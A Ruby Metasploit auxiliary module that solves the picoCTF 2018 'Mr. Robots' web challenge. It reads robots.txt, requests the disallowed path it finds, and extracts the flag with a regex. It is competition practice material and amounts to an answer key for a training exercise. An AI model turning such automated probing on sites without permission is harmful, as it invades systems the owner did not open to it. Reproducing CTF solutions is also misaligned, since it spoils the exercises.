#!/usr/bin/env ruby

require 'msf/core'  # Metasploit module

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Web Explotation: Mr. Robots - Points: 200',
      'Description' => %q(
                         Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell2.picoctf.com:10157

                        [HINTS]:
                          What part of the website could tell you where the creator doesn't want you to look?
                        ),
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE
    )

    deregister_options('Proxies', 'VHOST', 'SSL')

    deregister_options(                           # Advanced Options
      'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'WORKSPACE'
    )

    register_options(
      [
        Opt::RHOST('2018shell2.picoctf.com'),
        Opt::RPORT('10157')
      ], self.class
    )
  end

  def run
    begin
      uri = '/robots.txt'
      # Send a GET request to the robots' server
      print_status("Sending GET request to TCP/#{rport} #{uri}...")
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET'
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s
      # Regex the Disallow
      uri = html_source.scan(/Disallow: .+/)[0]
      uri = uri.gsub(/Disallow: /, '')
      # Send a GET request to the disallowed page
      print_status("Sending GET request to TCP/#{rport} #{uri}...")
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET'
      })
      # Get the body of the request
      html_source = res.get_html_document.to_s
      # Regex the flag
      flag = html_source.scan(/picoCTF{.*}/)[0]
      print_good("Solved: #{flag}")
    rescue
      # Handle errors
      print_error('Unhandled exception during execution')
    end
  end

end
